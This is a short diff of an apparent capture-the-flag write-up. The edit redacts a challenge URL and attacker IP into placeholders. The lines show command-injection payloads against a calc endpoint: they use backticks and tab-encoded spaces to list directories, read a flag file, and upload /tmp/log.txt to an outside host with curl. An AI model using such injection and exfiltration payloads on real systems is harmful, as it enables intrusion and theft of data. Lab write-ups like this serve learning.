@@ -646,7 +646,7 @@ url/calc?num=123%23`ls%09/`
 
 url/calc?num=123%23`cat%09/Th1*`
 
-http://a3083104-9be8-438f-9984-d62af926a2a8.node4.buuoj.cn:81/calc?num=123%23`curl%09-T%09/tmp/log.txt%09119.3.217.40:8899`
+url/calc?num=123%23`curl%09-T%09/tmp/log.txt%09ip:8899`
 ```
 
 ![](https://s2.loli.net/2022/04/18/falSeBvE9MzZjOn.png)
